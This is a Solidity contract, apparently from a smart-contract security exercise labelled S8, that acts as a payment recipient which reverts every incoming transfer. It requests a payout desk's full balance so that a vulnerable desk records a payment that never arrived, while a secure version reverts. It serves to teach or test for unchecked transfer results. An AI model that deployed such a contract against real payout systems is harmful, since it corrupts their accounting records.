// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IPayout} from "./IPayout.sol";

/**
 * @title Attacker
 * @notice In S8 the adversary is a recipient that refuses to be paid.
 * @dev `attack()` asks the desk to send it everything it holds. Against
 *      {VulnerablePayout} the ETH transfer fails but the desk records the
 *      payment anyway, so the ledger is silently wrong. Against {SecurePayout}
 *      the failure reverts the whole transaction.
 *
 *      {profit} deliberately reports the balance this contract actually
 *      received: zero. S8 is not a theft; it is a correctness bug whose cost is
 *      a payout desk that cannot be trusted about what it has paid.
 */
contract Attacker {
    /// @notice Desk being attacked.
    IPayout public immutable payout;

    /**
     * @param target address of the payout desk to attack
     */
    constructor(address target) {
        payout = IPayout(target);
    }

    /**
     * @notice Request the desk's entire ETH balance, then refuse it.
     */
    function attack() external {
        payout.payout(payable(address(this)), address(payout).balance);
    }

    /// @notice ETH this contract actually received (always zero).
    function profit() external view returns (uint256) {
        return address(this).balance;
    }

    /// @dev Refuses every incoming payment.
    receive() external payable {
        revert Rejected();
    }

    error Rejected();
}
